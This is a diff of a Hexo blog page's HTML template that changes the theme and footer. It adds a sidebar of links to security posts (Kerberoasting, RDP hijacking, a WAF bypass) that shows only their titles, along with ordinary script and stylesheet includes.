+			                    <li class="post-list-item"><a href="/c1y2m3.github.io/2019/01/17/---/">利用tscon未授权登录远程桌面</a></li>
+			                    
+			    
+			                    
+			                    <li class="post-list-item"><a href="/c1y2m3.github.io/2019/01/19/ 浅析Windows本地认证 /">浅析Windows本地认证</a></li>
+			                    
+			    
+			                    
+			                    <li class="post-list-item"><a href="/c1y2m3.github.io/2019/01/21/浅析Windows网络认证/">浅析Windows网络认证</a></li>
+			                    
+			    
+			                    
+			                    <li class="post-list-item"><a href="/c1y2m3.github.io/2019/01/22/Kerberos域认证/">理解Kerberos域认证</a></li>
+			                    
+			    
+			                    
+			                    <li class="post-list-item"><a href="/c1y2m3.github.io/2019/02/06/两种使用python实现SSRF检测/">python实现SSRF检测脚本</a></li>
+			                    
+			    
+			                    
+			                    <li class="post-list-item"><a href="/c1y2m3.github.io/2019/03/16/----1/">记一次域渗透攻击测试</a></li>
+			                    
+			    
+			                    
+			                    <li class="post-list-item"><a href="/c1y2m3.github.io/2019/04/02/15542127307091/">域渗透之Kerberoasting攻击</a></li>
+			                    
+			    
+			                    
+			                    <li class="post-list-item"><a href="/c1y2m3.github.io/2019/04/04/15543609538285/">JSP Shell Bypass WAF</a></li>
+			                    
+			    
+			                    
+			                    <li class="post-list-item"><a href="/c1y2m3.github.io/2019/05/26/26/">JBoss引起的内网渗透</a></li>
+			                    
+			    
+				            </ul>
+				        </div>
+				    </div>
+			</div>
+			
+		</div><!-- accordion -->
+	</div>
 </div>
-<footer class="footer-social">
-    
 
-    
+	</div>
+  </div>
+  <div class="container-narrow">
+	<footer> <p>
+  &copy; 2019 John Doe
+  
+      with help from <a href="http://zespia.tw/hexo/" target="_blank">Hexo</a> and <a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a>. Theme by <a href="http://github.com/wzpan/hexo-theme-wixo/">Wixo</a>.    
+</p> </footer>
+  </div> <!-- container-narrow -->
+  
+<a id="gotop" href="#">   
+  <span>▲</span> 
+</a>
 
-    
+<script src="/c1y2m3.github.io/js/jquery.imagesloaded.min.js"></script>
+<script src="/c1y2m3.github.io/js/gallery.js"></script>
+<script src="/c1y2m3.github.io/js/bootstrap.min.js"></script>
+<script src="/c1y2m3.github.io/js/jquery.tableofcontents.min.js"></script>
+<script src="/c1y2m3.github.io/js/tocgenerator.min.js"></script>
+<script src="/c1y2m3.github.io/js/main.js"></script>
+<script src="/c1y2m3.github.io/js/search.js"></script> 
 
-    <div class="footer-copyright">
-        <p class="time-line">
-            &copy;
-            
-            
-            2019
-            &nbsp;<i class="iconfont icon-heart"></i>&nbsp;
-            <a target="_blank" href="https://github.com/iJinxin">John Doe</a>
-        </p>
-        <p class="theme-info">
-            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme -
-            <a target="_blank" href="https://github.com/iJinxin/hexo-theme-sky">Sky</a>
-        </p>
-    </div>
-</footer>
-</body>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-<script src="/c1y2m3.github.io/js/index.js"></script>
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
-<script>
-    
 
+
+
+<link rel="stylesheet" href="/c1y2m3.github.io/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/c1y2m3.github.io/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
 </script>
+
+
+
+
+</body>
 </html>
